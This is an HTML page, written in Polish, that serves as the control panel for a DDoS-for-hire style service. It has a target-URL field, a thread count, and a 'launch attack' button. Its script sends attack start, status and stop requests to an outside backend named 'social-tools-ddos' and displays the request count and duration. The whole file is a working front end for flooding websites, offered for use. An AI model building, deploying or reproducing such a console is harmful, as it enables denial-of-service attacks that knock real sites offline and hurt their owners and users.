<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Social Tool Console</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        .box { border: 1px solid #00ff00; padding: 20px; max-width: 600px; margin: 0 auto; background: #111; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        input, button { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; }
        button:hover { background: #00ff00; color: #000; cursor: pointer; }
        .stats { margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
        #log { font-size: 12px; color: #888; margin-top: 10px; height: 100px; overflow-y: auto; border: 1px solid #222; padding: 5px; }
    </style>
</head>
<body>

<div class="box">
    <h2>[ SOCIAL-TOOLS CONSOLE ]</h2>
    <div id="status">Status: Łączenie z API...</div>
    
    <input type="text" id="url" placeholder="https://cel-ataku.pl" value="https://">
    <input type="number" id="threads" placeholder="Wątki (Max 50)" value="20">
    
    <button id="startBtn" onclick="start()">URUCHOM ATAK</button>
    <button id="stopBtn" onclick="stop()" style="display:none;">ZATRZYMAJ</button>

    <div class="stats" id="statsArea" style="display:none;">
        <div>Atak ID: <span id="statId">-</span></div>
        <div>Zapytania: <span id="statReq">0</span></div>
        <div>Czas: <span id="statTime">0</span>s</div>
    </div>

    <div id="log"></div>
</div>

<script>
    const API_BASE = "https://social-tools-ddos.onrender.com";
    let currentId = null;
    let timer = null;

    function addLog(msg) {
        const log = document.getElementById('log');
        log.innerHTML += `> ${msg}<br>`;
        log.scrollTop = log.scrollHeight;
    }

    async function checkStatus() {
        try {
            const r = await fetch(`${API_BASE}/api/status`);
            if(r.ok) document.getElementById('status').innerHTML = "Status: <span style='color:lime'>ONLINE</span>";
        } catch(e) {
            document.getElementById('status').innerHTML = "Status: <span style='color:red'>OFFLINE (Budzenie...)</span>";
        }
    }

    async function start() {
        const url = document.getElementById('url').value;
        const thr = document.getElementById('threads').value;

        addLog("Inicjowanie zapytania...");
        
        try {
            const r = await fetch(`${API_BASE}/api/attack/start`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url, threads: thr})
            });

            const data = await r.json();
            if(data.success) {
                currentId = data.attack_id;
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('stopBtn').style.display = 'block';
                document.getElementById('statsArea').style.display = 'block';
                document.getElementById('statId').innerText = currentId;
                addLog("Atak uruchomiony pomyślnie.");
                timer = setInterval(updateStats, 2000);
            } else {
                addLog("Błąd serwera: " + data.error);
            }
        } catch(e) {
            addLog("Błąd połączenia (CORS lub Crash). Sprawdź logi Render.");
        }
    }

    async function updateStats() {
        if(!currentId) return;
        try {
            const r = await fetch(`${API_BASE}/api/attack/status/${currentId}`);
            const data = await r.json();
            if(data.success) {
                document.getElementById('statReq').innerText = data.requests;
                document.getElementById('statTime').innerText = data.duration;
            }
        } catch(e) {}
    }

    async function stop() {
        if(!currentId) return;
        await fetch(`${API_BASE}/api/attack/stop/${currentId}`, {method: 'POST'});
        clearInterval(timer);
        addLog("Atak zatrzymany.");
        location.reload();
    }

    setInterval(checkStatus, 10000);
    checkStatus();
</script>

</body>
</html>
